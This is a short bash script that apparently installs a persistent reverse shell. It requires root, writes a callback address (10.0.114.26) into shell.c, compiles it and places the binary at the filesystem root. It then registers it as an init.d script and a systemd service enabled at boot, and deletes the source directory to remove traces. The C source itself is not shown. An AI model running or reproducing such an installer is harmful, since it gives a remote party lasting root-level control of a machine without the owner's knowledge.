#! /bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 
   exit 1
fi

chmod +x shellservice

sed -i -e 's/"LOCAL ADDRESS GOES HERE"/"10.0.114.26"/g' /home/reverse/reverse-shell/shell.c

gcc shell.c -o shell

mv shell /

mv shellservice /etc/init.d

mv vmshell.service /etc/systemd/system

systemctl enable vmshell.service

cd /
rm -rf reverse-shell
